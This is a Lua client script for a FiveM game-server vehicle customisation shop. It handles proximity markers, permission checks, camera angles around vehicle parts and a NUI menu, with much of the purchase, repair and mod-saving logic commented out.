cli = {}
Tunnel.bindInterface(GetCurrentResourceName(), cli)
vSERVER = Tunnel.getInterface(GetCurrentResourceName())

local configMechanics = config.mechanics

local nui = false
local block = false
-- local vehicle
-- local myveh = {}

local damage = 0
local cart = {['total'] = 0}
local prices = config.prices



local nui = false
local nearestBlips = {}

local _markerThread = false
local markerThread = function()
    if (_markerThread) then return; end;
    _markerThread = true
    Citizen.CreateThread(function()
		local _idle = 1000
        while (countTable(nearestBlips) > 0) do
            local ped = PlayerPedId()
            local _cache = nearestBlips
            for index, dist in pairs(_cache) do
                if (dist <= 10 and not nui) then
					_idle = 5
                    local config = configMechanics[index]
					DrawMarker(36, config.coord.x, config.coord.y, config.coord.z+0.1, 0, 0, 0, 0, 0, 0, 0.8, 0.8, 0.8, 0, 153, 255, 155, 1, 0, 0, 1)
					DrawMarker(27, config.coord.x, config.coord.y, config.coord.z-0.97, 0, 0, 0, 0, 0, 0, 3.0, 3.0, 3.0, 0, 153, 255, 155, 0, 0, 0, 1)
                    if (dist <= 1.2 and IsControlJustPressed(0, 38) and GetEntityHealth(ped) > 101) then
						openBennys(config)			
                    end
				else
					_idle = 1000
                end
            end
            Citizen.Wait(_idle)
        end
        _markerThread = false
    end)
end

Citizen.CreateThread(function()
    while (true) do
        local ped = PlayerPedId()
        local pCoord = GetEntityCoords(ped)
        nearestBlips = {}
        for k, v in pairs(configMechanics) do
            local distance = #(pCoord - v.coord)
            if (distance <= 10) then
                nearestBlips[k] = distance
            end
        end
        if (countTable(nearestBlips) > 0) then markerThread(); end;
        Citizen.Wait(1000)
    end
end)

local myVehicle = {}
local vehicle
local cam = nil
local gameplaycam = nil

openBennys = function(config)
	if (vSERVER.checkPermission(config.perm)) then
		vehicle = zero.getNearestVehicle(7)
		if (vehicle and vSERVER.checkVehicle(VehToNet(vehicle))) then
			myVehicle = getAllVehicleMods(vehicle)
			gameplaycam = GetRenderingCam()
			cam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true, 2)
			
			SetVehicleModKit(vehicle, 0)
			FreezeEntityPosition(vehicle, true)
			SendNUIMessage({ 
				action = 'vehicle', 
				vehicle = getVehicleMods(vehicle), 
				damage =  0 
			})
			openNui()
		end
	end
end

-- RegisterNUICallback('cam',function(data)
-- 	if data and data.cam then
-- 		if data.cam == 'freecam' then
-- 			freeCam()
-- 		else
-- 			camControl(data.cam)
-- 		end
-- 	end
-- end)

-- RegisterNUICallback('pagar',function(data)
-- 	if cart['total'] and func.checkPayment(cart['total']) then
-- 		SetNuiFocus(false,false)
-- 		SendNUIMessage({ action = 'applying' })
-- 		if not IsPedInAnyVehicle(PlayerPedId()) then
-- 			vRP.playAnim(false,{{'mini@repair','fixing_a_player'}},true)
-- 		end
-- 		TriggerEvent('progress',10000,'aplicando modificações')
-- 		Wait(10000)
-- 		--TriggerEvent('Notify','sucesso','Modificações aplicadas com <b>sucesso</b>.',7000)
-- 		vRP.stopAnim(false)
-- 		myveh = getAllVehicleMods(vehicle)
-- 		local vehname = GetDisplayNameFromVehicleModel(GetEntityModel(vehicle)):lower()
-- 		local vehplate = GetVehicleNumberPlateText(vehicle)
-- 		if config.use_modelname then
-- 			vehplate, vehname = vRP.ModelName(7)
-- 			while vehplate ~= GetVehicleNumberPlateText(vehicle) do
-- 				vehplate, vehname = vRP.ModelName(7)
-- 				Wait(500)
-- 			end
-- 		elseif config.use_vehlist then
-- 			_,_,vehplate, vehname = vRP.vehList(7)
-- 			while vehplate ~= GetVehicleNumberPlateText(vehicle) do
-- 				_,_,vehplate, vehname = vRP.vehList(7)
-- 				Wait(500)
-- 			end
-- 		elseif config.javao then
-- 			javao = Proxy.getInterface('vrp_garages')
-- 			vehplate, vehname = javao.ModelName2(7)
-- 			while vehplate ~= GetVehicleNumberPlateText(vehicle) do
-- 				vehplate, vehname = javao.ModelName2(7)
-- 				Wait(500)
-- 			end
-- 		end
-- 		func.saveVehicle(vehname,vehplate,myveh)
-- 		fclient.closeNui()
-- 	end
-- end)

-- RegisterNUICallback('callbacks',function(data)
-- 	if data then
-- 		if data.type == 'reparar' then
-- 			if block then
-- 				return
-- 			end
-- 			block = true
-- 			if func.repairVehicle(vehicle,damage) then
-- 				SetVehicleDoorOpen(vehicle, 4, 0, 0)
-- 				if not IsPedInAnyVehicle(PlayerPedId()) then
-- 					vRP.playAnim(false,{{'mini@repair','fixing_a_player'}},true)
-- 				end
-- 				TriggerEvent('progress',10000,'reparando')
-- 				Wait(10000)
-- 				SetVehicleFixed(vehicle)
-- 				SetVehicleDirtLevel(vehicle,0.0)
-- 				SetVehicleUndriveable(vehicle,false)
-- 				SetEntityAsMissionEntity(vehicle,true,true)
-- 				SetVehicleOnGroundProperly(vehicle)
-- 				myveh.damage = 0.0
-- 				vRP.stopAnim(false)
-- 				TriggerEvent('Notify','sucesso','Veículo reparado com <b>sucesso</b>.',7000)
-- 				SendNUIMessage({ action = 'repair' })
-- 			end
-- 			block = false
-- 		elseif data.type == 'cor-primaria' or data.type == 'cor-secundaria' then
-- 			local color = split(data.color, ',')
-- 			vehicleCustomColor(data.type, vehicle, color)
-- 		elseif string.find(data.type, 'turbo') then
-- 			local turbo = parseInt(split(data.type, '-')[2])
-- 			if turbo > 0 then
-- 				ToggleVehicleMod(vehicle,mod['turbo'],true)
-- 			else
-- 				ToggleVehicleMod(vehicle,mod['turbo'],false)
-- 			end
-- 			updateCart(myveh, mod['turbo'], turbo)
-- 		elseif string.find(data.type,'motor') or string.find(data.type,'freios') or string.find(data.type,'transmissão') or string.find(data.type,'suspensão') then
-- 			local type = split(data.type,'-')[1]
-- 			local level = parseInt(split(data.type, '-')[2]) - 1
-- 			SetVehicleMod(vehicle,mod[type],level)
-- 			updateCart(myveh, mod[type], level)
-- 		elseif string.find(data.type, 'neon') then
-- 			local type = split(data.type, '-')[2]
-- 			if type == 'kit' then
-- 				setNeon(vehicle,true)
-- 				updateCart(myveh, 'neon', 1)
-- 			elseif type == 'default' then
-- 				setNeon(vehicle,false)
-- 				updateCart(myveh, 'neon', 0)
-- 			elseif type == 'colors' then
-- 				local color = split(data.color, ',')
-- 				neonColor(vehicle,color)
-- 			end
-- 			SetVehicleLights(vehicle,2)
-- 		elseif string.find(data.type, 'farol') then
-- 			SetVehicleLights(vehicle,2)
-- 			local type = split(data.type, '-')[2]
-- 			if type then
-- 				if type == 'xenon' then
-- 					setXenon(vehicle,true)
-- 					updateCart(myveh, mod['farol'], 1)
-- 				else
-- 					setXenon(vehicle,false)
-- 					updateCart(myveh, mod['farol'], 0)
-- 				end
-- 			end
-- 		elseif string.find(data.type,'xenon') then
-- 			local colorindex = parseInt(split(data.type, '-')[3])
-- 			SetVehicleXenonLightsColour(vehicle,colorindex)
-- 		elseif string.find(data.type,'pneus') then
-- 			local type = split(data.type, '-')[1]
-- 			local modindex = GetVehicleMod(vehicle,mod['dianteira'])
-- 			if type == 'fabrica' then
-- 				SetVehicleMod(vehicle,mod['dianteira'],modindex,false)
-- 				SetVehicleTyresCanBurst(vehicle,true)
-- 				updateCart(myveh, 'fabrica', 0)
-- 			elseif type == 'custom' then
-- 				SetVehicleMod(vehicle,mod['dianteira'],modindex,true)
-- 				updateCart(myveh, 'custom', 1)
-- 			elseif type == 'bulletproof' then
-- 				SetVehicleTyresCanBurst(vehicle,false)
-- 				updateCart(myveh, 'bulletproof', 1)
-- 			end
-- 		elseif string.find(data.type,'smoke') then
-- 			local color = split(data.color, ',')
-- 			smokeColor(vehicle,color)
-- 		elseif string.find(data.type, 'primaria') or string.find(data.type, 'secundaria') then
-- 			local type = split(data.type, '-')[2]
-- 			local color = split(data.type, '-')[3]
-- 			local colorindex = split(data.type, '-')[4]
-- 			if colors[color] then
-- 				if #colors[color] > 1 and colorindex then
-- 					colorindex = parseInt(colorindex)
-- 					vehicleColor(type,vehicle,colors[color][colorindex],color)
-- 				else
-- 					vehicleColor(type,vehicle,colors[color][1],color)
-- 				end
-- 			end
-- 		elseif string.find(data.type, 'blindagem') then
-- 			local blindagem = data.blindagem
-- 			if blindagem then
-- 				SetVehicleMod(vehicle,mod['blindagem'],blindagem)
-- 			end
-- 			updateCart(myveh, mod['blindagem'], blindagem)
-- 		elseif string.find(data.type, 'placa') then
-- 			local type = parseInt(split(data.type, '-')[2])
-- 			SetVehicleNumberPlateTextIndex(vehicle,type)
-- 			updateCart(myveh, 'placa', type)
-- 		elseif string.find(data.type, 'vidro') then
-- 			local tint = parseInt(split(data.type, '-')[2])
-- 			SetVehicleWindowTint(vehicle,tint)
-- 			updateCart(myveh, 'vidro', tint)
-- 		elseif string.find(data.type, 'perolado') then
-- 			local colorindex = split(data.type, '-')[3]
-- 			if colorindex then
-- 				vehiclePerolado(vehicle,parseInt(colorindex))
-- 				updateCart(myveh, 'perolado', colorindex)
-- 			end
-- 		elseif string.find(data.type, 'wheelcolor') then
-- 			local colorindex = split(data.type, '-')[2]
-- 			if colorindex then
-- 				vehicleWheelColor(vehicle,parseInt(colorindex))
-- 				updateCart(myveh, 'wheelcolor', colorindex)
-- 			end
-- 		elseif wheeltype[data.type] or wheeltype[split(data.type,'-')[1]] then
-- 			local type = wheeltype[data.type]
-- 			local index = -1
-- 			if not type then
-- 				type = wheeltype[split(data.type,'-')[1]]
-- 				index = parseInt(split(data.type,'-')[2])-1
-- 			end
-- 			SetVehicleWheelType(vehicle,type)
-- 			SetVehicleMod(vehicle,mod['dianteira'],index,false)
-- 			updateCart(myveh, mod['dianteira'], index)
-- 		elseif mod[split(data.type,'-')[1]] or mod[tostring(split(data.type,'-')[1]..'-'..split(data.type,'-')[2])] then
-- 			local modType = mod[split(data.type,'-')[1]]
-- 			local index = parseInt(split(data.type,'-')[2]) - 1
-- 			if split(data.type,'-')[3] then
-- 				modType = mod[split(data.type,'-')[1]..'-'..split(data.type,'-')[2]]
-- 				index = parseInt(split(data.type,'-')[3]) - 1
-- 			end
-- 			SetVehicleMod(vehicle,modType,index,false)
-- 			if modType == mod['buzina'] then
-- 				StartVehicleHorn(vehicle, 5000, 'HELDDOWN', true)
-- 			end
-- 			updateCart(myveh, modType, index)
-- 		end
-- 	end
-- end)

-- -----------------------------------------------------------------------------------------------------------------------------------------
-- -- FUNÇÕES
-- -----------------------------------------------------------------------------------------------------------------------------------------

-- function updateCart(myveh, modtype, index, colortype)
-- 	if myveh == nil or modtype == nil or index == nil then
-- 		return
-- 	end
-- 	if modtype == mod['turbo'] or modtype == mod['farol'] then
-- 		if cart[tostring(modtype)] == nil then
-- 			if myveh.mods[modtype].mod < 1 and index > 0 then
-- 				cart[tostring(modtype)] = 1
-- 				cart['total'] = cart['total'] + prices[modtype].startprice
-- 			end
-- 		elseif cart[tostring(modtype)] > 0 and index < 1 then
-- 			cart['total'] = cart['total'] - prices[modtype].startprice
-- 			cart[tostring(modtype)] = nil
-- 		end
-- 	elseif modtype == 'neon' then
-- 		if cart[modtype] == nil then
-- 			if not myveh.neon and index > 0 then
-- 				cart[modtype] = 1
-- 				cart['total'] = cart['total'] + prices[modtype].startprice
-- 			end
-- 		elseif cart[modtype] > 0 and index < 1 then
-- 			cart['total'] = cart['total'] - prices[modtype].startprice
-- 			cart[modtype] = nil
-- 		end	
-- 	elseif modtype == 'bulletproof' or modtype == 'custom' or modtype == 'fabrica' then
-- 		if modtype == 'fabrica' then
-- 			if cart['bulletproof'] ~= nil then
-- 				cart['total'] = cart['total'] - prices['bulletproof'].startprice
-- 				cart['bulletproof'] = nil
-- 			end
-- 			if cart['custom'] ~= nil then
-- 				cart['total'] = cart['total'] - prices['custom'].startprice
-- 				cart['custom'] = nil
-- 			end
-- 			SendNUIMessage({action = 'price', price = cart['total']})
-- 			return
-- 		end
-- 		local type = not myveh.bulletProofTyres
-- 		if modtype == 'custom' then
-- 			type = myveh.mods[mod['dianteira']].variation
-- 		end
-- 		if cart[modtype] == nil then
-- 			if not type and index > 0 then
-- 				cart[modtype] = 1
-- 				cart['total'] = cart['total'] + prices[modtype].startprice
-- 			end
-- 		elseif cart[modtype] > 0 and index < 1 then
-- 			cart['total'] = cart['total'] - prices[modtype].startprice
-- 			cart[modtype] = nil
-- 		end
-- 	elseif modtype == 'wheelcolor' or modtype == 'perolado' then
-- 		index = parseInt(index)
-- 		local type = myveh.extracolor[1]
-- 		if modtype == 'wheelcolor' then
-- 			type = myveh.extracolor[2]
-- 		end
-- 		if cart[modtype] == nil and type ~= index and index > 0 then
-- 			cart[modtype] = index
-- 			cart['total'] = cart['total'] + prices[modtype].startprice
-- 		elseif type ~= index and index > 0 then
-- 			cart[modtype] = index
-- 		elseif (index < 1 or type == index) and cart[modtype] ~= nil then
-- 			cart['total'] = cart['total'] - prices[modtype].startprice
-- 			cart[modtype] = nil
-- 		end
-- 	elseif modtype == 'primaria' or modtype == 'secundaria' then
-- 		local type = myveh.color[1]
-- 		local vehcolortype = myveh.pcolortype
-- 		local cartcolortype = cart['pcolortype']
-- 		if modtype == 'secundaria' then
-- 			type = myveh.color[2]
-- 			vehcolortype = myveh.scolortype
-- 			cartcolortype = cart['scolortype']
-- 		end
-- 		if colortype and config.prices['colortypes'][colortype] then
-- 			if cartcolortype == nil and colortype ~= vehcolortype then
-- 				local price = config.prices['colortypes'][colortype]
-- 				cartcolortype = colortype
-- 				cart['total'] = cart['total'] + price
-- 			elseif colortype == vehcolortype and config.prices['colortypes'][cartcolortype] then
-- 				local price = config.prices['colortypes'][cartcolortype]
-- 				cart['total'] = cart['total'] - price
-- 				cartcolortype = nil
-- 			elseif config.prices['colortypes'][cartcolortype] then
-- 				local price = config.prices['colortypes'][cartcolortype]
-- 				cart['total'] = cart['total'] - price
-- 				cartcolortype = colortype
-- 				price = config.prices['colortypes'][colortype]
-- 				cart['total'] = cart['total'] + price
-- 			end
-- 			if modtype == 'primaria' then
-- 				cart['pcolortype'] = cartcolortype
-- 			else
-- 				cart['scolortype'] = cartcolortype
-- 			end
-- 		end
-- 		if cart[modtype] == nil and type ~= nil and index ~= nil and type ~= index and index > 0 then
-- 			cart[modtype] = index
-- 			cart['total'] = cart['total'] + prices[modtype].startprice
-- 		elseif type ~= nil and index ~= nil and type ~= index and index > 0 then
-- 			cart[modtype] = index
-- 		elseif (index < 1 or type == index) and cart[modtype] ~= nil then
-- 			cart['total'] = cart['total'] - prices[modtype].startprice
-- 			cart[modtype] = nil
-- 		end
-- 	elseif modtype == 'cor-primaria' or modtype == 'cor-secundaria' then
-- 		local type = myveh.customPcolor
-- 		if modtype == 'cor-secundaria' then
-- 			type = myveh.customScolor
-- 		end
-- 		if cart[modtype] == nil and not sameColor(index,type) then
-- 			cart[modtype] = index
-- 			cart['total'] = cart['total'] + prices[modtype].startprice
-- 		elseif sameColor(index,type) then
-- 			cart['total'] = cart['total'] - prices[modtype].startprice
-- 			cart[modtype] = nil
-- 		end
-- 	elseif modtype == 'vidro' then
-- 		if cart[modtype] == nil and myveh.windowtint ~= index and index > 0 then
-- 			cart[modtype] = index
-- 			cart['total'] = cart['total'] + (prices[modtype].startprice + prices[modtype].increaseby * p(index-1))
-- 		elseif myveh.windowtint ~= index and index > 0 then
-- 			cart['total'] = cart['total'] - (prices[modtype].startprice + prices[modtype].increaseby * p(cart[modtype]-1))
-- 			cart[modtype] = index
-- 			cart['total'] = cart['total'] + (prices[modtype].startprice + prices[modtype].increaseby * p(index-1))
-- 		elseif (index < 1 or myveh.windowtint == index) and cart[modtype] ~= nil then
-- 			cart['total'] = cart['total'] - (prices[modtype].startprice + prices[modtype].increaseby * p(cart[modtype]-1))
-- 			cart[modtype] = nil
-- 		end
-- 	elseif modtype == 'placa' then
-- 		if cart[modtype] == nil and myveh.plateindex ~= index and index > 0 then
-- 			cart[modtype] = index
-- 			cart['total'] = cart['total'] + (prices[modtype].startprice + prices[modtype].increaseby * p(index-1))
-- 		elseif myveh.plateindex ~= index and index > 0 then
-- 			cart['total'] = cart['total'] - (prices[modtype].startprice + prices[modtype].increaseby * p(cart[modtype]-1))
-- 			cart[modtype] = index
-- 			cart['total'] = cart['total'] + (prices[modtype].startprice + prices[modtype].increaseby * p(index-1))
-- 		elseif (index < 1 or myveh.plateindex == index) and cart[modtype] ~= nil then
-- 			cart['total'] = cart['total'] - (prices[modtype].startprice + prices[modtype].increaseby * p(cart[modtype]-1))
-- 			cart[modtype] = nil
-- 		end
-- 	elseif cart[tostring(modtype)] == nil and myveh.mods[modtype].mod ~= index and index > -1 then
-- 		cart[tostring(modtype)] = index
-- 		cart['total'] = cart['total'] + (prices[modtype].startprice + prices[modtype].increaseby * index)
-- 	elseif myveh.mods[modtype].mod ~= index and index > -1 then
-- 		cart['total'] = cart['total'] - (prices[modtype].startprice + prices[modtype].increaseby * cart[tostring(modtype)])
-- 		cart[tostring(modtype)] = index
-- 		cart['total'] = cart['total'] + (prices[modtype].startprice + prices[modtype].increaseby * index)
-- 	elseif (index < 0 or myveh.mods[modtype].mod == index) and cart[tostring(modtype)] ~= nil then
-- 		cart['total'] = cart['total'] - (prices[modtype].startprice + prices[modtype].increaseby * cart[tostring(modtype)])
-- 		cart[tostring(modtype)] = nil
-- 	end
-- 	SendNUIMessage({action = 'price', price = cart['total']})
-- end

-- function p(nro)
-- 	if nro < 0 then
-- 		return 0
-- 	end
-- 	return nro
-- end

-- function setVehicleMods(veh,myveh,tunnerChip)
-- 	SetVehicleModKit(veh,0)
-- 	if not myveh or not myveh.customPcolor then
-- 		return
-- 	end
-- 	local bug = false
-- 	local primary = myveh.color[1]
-- 	local secondary = myveh.color[2]
-- 	local cprimary = myveh.customPcolor
-- 	if cprimary['1'] then
-- 		bug = true
-- 	end
-- 	local csecondary = myveh.customScolor
-- 	local perolado = myveh.extracolor[1]
-- 	local wheelcolor = myveh.extracolor[2]
-- 	local neoncolor = myveh.neoncolor
-- 	local smokecolor = myveh.smokecolor
-- 	ClearVehicleCustomPrimaryColour(veh)
-- 	ClearVehicleCustomSecondaryColour(veh)
-- 	SetVehicleWheelType(veh,myveh.wheeltype)
-- 	SetVehicleColours(veh,primary,secondary)
-- 	if bug then
-- 		SetVehicleCustomPrimaryColour(veh,cprimary['1'],cprimary['2'],cprimary['3'])
-- 		SetVehicleCustomSecondaryColour(veh,csecondary['1'],csecondary['2'],csecondary['3'])
-- 	else
-- 		SetVehicleCustomPrimaryColour(veh,cprimary[1],cprimary[2],cprimary[3])
-- 		SetVehicleCustomSecondaryColour(veh,csecondary[1],csecondary[2],csecondary[3])
-- 	end
-- 	SetVehicleExtraColours(veh,perolado,wheelcolor)
-- 	SetVehicleNeonLightsColour(veh,neoncolor[1],neoncolor[2],neoncolor[3])
-- 	SetVehicleXenonLightsColour(veh,myveh.xenoncolor)
-- 	SetVehicleNumberPlateTextIndex(veh,myveh.plateindex)
-- 	SetVehicleWindowTint(veh,myveh.windowtint)
-- 	for i,t in pairs(myveh.mods) do 
-- 		if tonumber(i) == 22 or tonumber(i) == 18 then
-- 			if t.mod > 0 then
-- 				ToggleVehicleMod(veh,tonumber(i),true)
-- 			else
-- 				ToggleVehicleMod(veh,tonumber(i),false)
-- 			end
-- 		elseif tonumber(i) == 20 then
-- 			smokeColor(veh,smokecolor)
-- 		elseif tonumber(i) == 23 or tonumber(i) == 24 then
-- 			SetVehicleMod(veh,tonumber(i),tonumber(t.mod),tonumber(t.variation))
-- 		else
-- 			SetVehicleMod(veh,tonumber(i),tonumber(t.mod))
-- 		end
-- 	end
-- 	SetVehicleTyresCanBurst(veh,myveh.bulletProofTyres)
-- 	if myveh.neon then
-- 		for i = 0, 3 do
-- 			SetVehicleNeonLightEnabled(veh,i,true)
-- 		end
-- 	else
-- 		for i = 0, 3 do
-- 			SetVehicleNeonLightEnabled(veh,i,false)
-- 		end
-- 	end
-- 	if myveh.damage > 0 then
-- 		SetVehicleBodyHealth(veh,myveh.damage)
-- 	end

-- end



-- function setNeon(veh,toggle)
-- 	for i = 0, 3 do
-- 		SetVehicleNeonLightEnabled(veh,i,toggle)
-- 	end
-- end

-- function setXenon(veh,toggle)
-- 	ToggleVehicleMod(veh,mod['farol'],toggle)
-- end

-- function vehicleCustomColor(type,veh,color)
-- 	local r,g,b = parseInt(color[1]),parseInt(color[2]),parseInt(color[3])
-- 	if type == 'cor-primaria' then
-- 		SetVehicleCustomPrimaryColour(veh,r,g,b)
-- 		updateCart(myveh, type, {r,g,b})
-- 	elseif type == 'cor-secundaria' then
-- 		SetVehicleCustomSecondaryColour(veh,r,g,b)
-- 		updateCart(myveh, type, {r,g,b})
-- 	end
-- end

-- function sameColor(c1,c2)
-- 	if c1[1] ~= c2[1] or c1[2] ~= c2[2] or c1[3] ~= c2[3] then
-- 		return false
-- 	end
-- 	return true
-- end

-- function neonColor(veh,color)
-- 	local r,g,b = parseInt(color[1]),parseInt(color[2]),parseInt(color[3])
-- 	SetVehicleNeonLightsColour(veh,r,g,b)
-- end

-- function smokeColor(veh,color)
-- 	local r,g,b = parseInt(color[1]),parseInt(color[2]),parseInt(color[3])
-- 	ToggleVehicleMod(veh,mod['smoke'],true)
-- 	SetVehicleTyreSmokeColor(veh,r,g,b)
-- end

-- function vehicleColor(type,veh,color,colortype)
-- 	SetVehicleModKit(veh,0)
-- 	local p,s = GetVehicleColours(veh)
-- 	if type == 'primaria' then
-- 		ClearVehicleCustomPrimaryColour(veh)
-- 		SetVehicleColours(veh,color,s)
-- 	elseif type == 'secundaria' then
-- 		ClearVehicleCustomSecondaryColour(veh)
-- 		SetVehicleColours(veh,p,color)
-- 	end
-- 	updateCart(myveh, type, color,colortype)
-- end

-- function vehiclePerolado(veh,i)
-- 	local perolado,wcolor = GetVehicleExtraColours(veh)
-- 	SetVehicleExtraColours(veh,i,wcolor)
-- end

-- function vehicleWheelColor(veh,i)
-- 	local perolado,wcolor = GetVehicleExtraColours(veh)
-- 	SetVehicleExtraColours(veh,perolado,i)
-- end

-- function split(s, delimiter)
--     result = {};
--     for match in (s..delimiter):gmatch('(.-)'..delimiter) do
--         table.insert(result, match);
--     end
--     return result;
-- end

-- function isVehicleTooFar(veh)
-- 	Citizen.CreateThread(function()
-- 		while nui do
-- 			local vehcoords = GetEntityCoords(veh)
-- 			local playercoords = GetEntityCoords(PlayerPedId())
-- 			local distance = #(playercoords - vehcoords)
-- 			if distance > 7 then
-- 				fclient.closeNui()
-- 				TriggerEvent('Notify','aviso','Você se afastou muito do veículo.',7000)
-- 			end
-- 			Citizen.Wait(500)
-- 		end
-- 	end)

-- end


local f = function(n)
	return (n + 0.00001)
end

local PointCamAtBone = function(bone,ox,oy,oz)
	SetCamActive(cam, true)
	local veh = vehicle
	local b = GetEntityBoneIndexByName(veh, bone)
	if b and b > -1 then
		local bx,by,bz = table.unpack(GetWorldPositionOfEntityBone(veh, b))
		local ox2,oy2,oz2 = table.unpack(GetOffsetFromEntityGivenWorldCoords(veh, bx, by, bz))
		local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(veh, ox2 + f(ox), oy2 + f(oy), oz2 +f(oz)))
		SetCamCoord(cam, x, y, z)
		PointCamAtCoord(cam,GetOffsetFromEntityInWorldCoords(veh, 0, oy2, oz2))
		RenderScriptCams( 1, 1, 1000, 0, 0)
	end
end

local MoveVehCam = function(pos,x,y,z)
	SetCamActive(cam, true)
	local veh = vehicle
	local vx,vy,vz = table.unpack(GetEntityCoords(veh))
	local d = GetModelDimensions(GetEntityModel(veh))
	local length,width,height = d.y*-2, d.x*-2, d.z*-2
	local ox,oy,oz
	if pos == 'front' then
		ox,oy,oz= table.unpack(GetOffsetFromEntityInWorldCoords(veh, f(x), (length/2)+ f(y), f(z)))
	elseif pos == 'front-top' then
		ox,oy,oz= table.unpack(GetOffsetFromEntityInWorldCoords(veh, f(x), (length/2) + f(y),(height) + f(z)))
	elseif pos == 'back' then
		ox,oy,oz= table.unpack(GetOffsetFromEntityInWorldCoords(veh, f(x), -(length/2) + f(y),f(z)))
	elseif pos == 'back-top' then
		ox,oy,oz= table.unpack(GetOffsetFromEntityInWorldCoords(veh, f(x), -(length/2) + f(y),(height/2) + f(z)))
	elseif pos == 'left' then
		ox,oy,oz= table.unpack(GetOffsetFromEntityInWorldCoords(veh, -(width/2) + f(x), f(y), f(z)))
	elseif pos == 'right' then
		ox,oy,oz= table.unpack(GetOffsetFromEntityInWorldCoords(veh, (width/2) + f(x), f(y), f(z)))
	elseif pos == 'middle' then
		ox,oy,oz= table.unpack(GetOffsetFromEntityInWorldCoords(veh, f(x), f(y), (height/2) + f(z)))
	end
	SetCamCoord(cam, ox, oy, oz)
	PointCamAtCoord(cam,GetOffsetFromEntityInWorldCoords(veh, 0, 0, f(0)))
	RenderScriptCams( 1, 1, 1000, 0, 0)
end

camControl = function(c)
	if (c == 'parachoque-dianteiro' or c == 'grelha' or c == 'arch-cover') then
		MoveVehCam('front',-0.6,1.5,0.4)
	elseif (c == 'cor-primaria' or c == 'cor-secundaria' or c == 'decal') then
		MoveVehCam('middle',-2.6,2.5,1.4)
	elseif  (c == 'parachoque-traseiro'  or c == 'escapamento') then
		MoveVehCam('back',-0.5,-1.5,0.2)
	elseif (c == 'capô') then
		MoveVehCam('front-top',-0.5,1.3,1.0)
	elseif (c == 'teto') then
		MoveVehCam('middle',-2.2,2,1.5)
	elseif (c == 'vidro') then
		MoveVehCam('middle',-2.0,2,0.5)
	elseif (c == 'farol' or c == 'xenon-colors') then
		MoveVehCam('front',-0.6,1.3,0.6)
	elseif (c == 'placa') then
		MoveVehCam('back',0,-1,0.2)
	elseif (c == 'para-lama') then
		MoveVehCam('left',-1.8,-1.3,0.7)
	elseif (c == 'saias') then
		MoveVehCam('left',-1.8,-1.3,0.7)
	elseif (c == 'aerofólio') then
		MoveVehCam('back',0.5,-1.6,1.3)
	elseif (c == 'traseira') then
		PointCamAtBone('wheel_lr',-1.4,0,0.3)
	elseif (c == 'dianteira' or c == 'wheel-accessories' or  c == 'wheel-colors' or c == 'sport' or c == 'muscle' or c == 'lowrider'  or c == 'highend' or c == 'suv' or c == 'offroad' or c == 'tuner') then
		PointCamAtBone('wheel_lf',-1.4,0,0.3)
	elseif (c == 'neon' or c == 'neon-colors' or c == 'suspensão') then
		if not IsThisModelABike(GetEntityModel(vehicle)) then
			PointCamAtBone('neon_l',-2.0,2.0,0.4)
		end
	elseif (c == 'janela' or c == 'interior' or c == 'ornaments' or c == 'dashboard' or c == 'dials' or c == 'seats' or c =='roll-cage') then
		MoveVehCam('back-top',0.0,4.0,0.7)
	elseif c == 'doors' then
		SetVehicleDoorOpen(vehicle, 0, 0, 0)
		SetVehicleDoorOpen(vehicle, 1, 0, 0)
		doorsopen = true
	elseif IsCamActive(cam) then
		ResetCam()
	else
		if (doorsopen) then
			SetVehicleDoorShut(vehicle, 0, 0)
			SetVehicleDoorShut(vehicle, 1, 0)
			SetVehicleDoorShut(vehicle, 4, 0)
			SetVehicleDoorShut(vehicle, 5, 0)
			doorsopen = false
		end
	end
end

freeCam = function()
	Citizen.CreateThread(function()
		SetNuiFocus(false,false)
		ResetCam()
		local freecam = true
		while (freecam and nui) do
			if (IsControlJustPressed(0, 85)) then
				freecam = false
				SetNuiFocus(true, true)
				SendNUIMessage({ 
					action = 'cam' 
				})
			end
			Citizen.Wait(5)
		end
	end)
end

ResetCam = function()
	SetCamCoord(cam,GetGameplayCamCoords())
	SetCamRot(cam, GetGameplayCamRot(2), 2)
	RenderScriptCams( 0, 1, 1000, 0, 0)
	SetCamActive(gameplaycam, true)
	EnableGameplayCam(true)
	SetCamActive(cam, false)
end

openNui = function()
	nui = true
	SetNuiFocus(true, true)
	SendNUIMessage({
		action = 'showMenu'
	})
end

closeNui = function()
	nui = false
	SetNuiFocus(false, false)
	SendNUIMessage({ 
		action = 'hideMenu' 
	})

	if (IsCamActive(cam)) then SetCamActive(cam, false); end;
	ResetCam()
	camControl('close')
	SetVehicleLights(vehicle, 0)
	FreezeEntityPosition(vehicle, false)

	vehicle = nil
	cam = nil
	cart = { ['total'] = 0 }
	myVehicle = {}
end

-- function fclient.closeNui()
-- 	if IsCamActive(cam) then
-- 		SetCamActive(cam, false)
-- 	end
-- 	SetVehicleLights(vehicle,0)
-- 	ResetCam()
-- 	SetNuiFocus(false,false)
-- 	SendNUIMessage({ action = 'hideMenu' })
-- 	camControl('close')
-- 	setVehicleMods(vehicle,myveh)
-- 	FreezeEntityPosition(vehicle,false)
-- 	func.removeVehicle(VehToNet(vehicle))
-- 	nui = false
-- 	vehicle = nil
-- 	cam = nil
-- 	damage = 0
-- 	cart = {['total'] = 0}
-- 	myveh = {}
-- end

-- RegisterNetEvent('nation:applymods')
-- AddEventHandler('nation:applymods', function(veh,vname)
-- 	if veh then
-- 		local vehname = GetDisplayNameFromVehicleModel(GetEntityModel(veh)):lower()
-- 		if (config.use_modelname or config.use_vehlist or config.javao) and vname then
-- 			vehname = vname
-- 		end
-- 		local vehplate = GetVehicleNumberPlateText(veh)
-- 		local custom = func.getSavedMods(vehname,vehplate)
-- 		print(json.encode(custom))
-- 		if custom then
-- 			TriggerServerEvent('nation:syncApplyMods',custom,VehToNet(veh))
-- 		end
-- 	end
-- end)

-- RegisterNetEvent('vrp_garages:mods')
-- AddEventHandler('vrp_garages:mods',function(vnet,custom)
-- 	TriggerEvent('nation:applymods',nveh,vehname)
-- end)

-- RegisterNetEvent('nation:applymods_sync')
-- AddEventHandler('nation:applymods_sync',function(custom,vnet)
-- 	if NetworkDoesEntityExistWithNetworkId(vnet) then
-- 		local veh = NetToVeh(vnet)
-- 		if DoesEntityExist(veh) then
-- 			if custom and custom.customPcolor then
-- 				setVehicleMods(veh,custom)
-- 				SetVehicleDirtLevel(veh,0.0)
-- 			else
-- 				TriggerEvent('vrp_garages:mods', vnet, custom)
-- 			end
-- 		end
-- 	end
-- end)

